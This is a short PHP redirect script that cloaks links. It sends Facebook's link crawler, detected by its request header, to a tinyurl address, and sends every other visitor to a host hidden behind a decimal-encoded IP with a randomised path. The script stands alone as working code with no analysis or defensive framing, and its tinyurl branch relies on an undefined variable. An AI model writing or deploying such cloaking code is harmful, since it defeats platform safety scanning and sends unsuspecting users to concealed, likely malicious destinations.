<?php
  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
    header("Location: https://tinyurl.com/$id");
  }else{
    header("Location: http://2335939030/".rand(111111,999999).".".rand(1,9999999));
  }
?>
